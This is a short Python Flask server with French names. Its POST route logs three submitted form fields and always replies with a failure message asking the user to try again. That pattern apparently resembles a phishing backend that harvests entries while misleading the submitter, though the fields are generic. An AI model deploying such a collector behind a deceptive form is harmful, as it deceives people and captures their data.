from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def accueil():
    return "Serveur Flask actif."

@app.route("/recevoir", methods=["POST"])
def recevoir():
    champ1 = request.form.get("champ1")
    champ2 = request.form.get("champ2")
    champ3 = request.form.get("champ3")

    print("Champ 1 :", champ1)
    print("Champ 2 :", champ2)
    print("Champ 3 :", champ3)

    return "Échec, veuillez réessayer ❌"
